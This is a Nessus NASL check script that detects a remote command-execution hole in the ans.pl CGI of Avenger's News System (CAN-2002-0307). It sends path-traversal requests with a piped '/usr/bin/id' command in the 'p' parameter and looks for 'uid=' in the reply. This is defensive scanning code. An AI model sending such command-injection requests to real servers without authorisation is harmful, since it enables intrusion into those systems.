if(description)
{
 script_id(10875);
 script_version("$Revision: 1.10 $");
 script_bugtraq_id(4147);
 script_cve_id("CAN-2002-0307");
 
 name["english"] = "Avenger's News System Command Execution";
 script_name(english:name["english"]);
 
 desc["english"] = "
A security vulnerability in Avenger's News System (ANS) allows
command execution by remote attackers who have access to the ANS 
page.

Risk factor : High
Solution : see http://www.securiteam.com/unixfocus/5MP090A6KG.html";

 script_description(english:desc["english"]);
 
 summary["english"] = "Avenger's News System Command Execution";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2002 SecurITeam");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL ) exit(0);

  if (("uid=" >< buf) && ("groups=" >< buf))
  {
   	security_hole(port:port);
	return(1);
  }
 return(0);
}

port = get_kb_item("Services/www");
if(!port)port = 80;



cginameandpath[0] = string("/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[1] = string("/ans/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[2] = "";

i = 0;
if(get_port_state(port))
{
 for (i = 0; cginameandpath[i]; i = i + 1)
 { 
  url = cginameandpath[i];
  if(check(req:url))exit(0);
 }
}

foreach dir (cgi_dirs())
{
cginameandpath[0] = string(dir, "/ans.pl?p=../../../../../usr/bin/id|&blah");
cginameandpath[1] = string(dir, "/ans/ans.pl?p=../../../../../usr/bin/id|&blah");

i = 0;
if(get_port_state(port))
{
 for (i = 0; cginameandpath[i]; i = i + 1)
 { 
  url = cginameandpath[i];
  if(check(req:url))exit(0);
 }
}
}
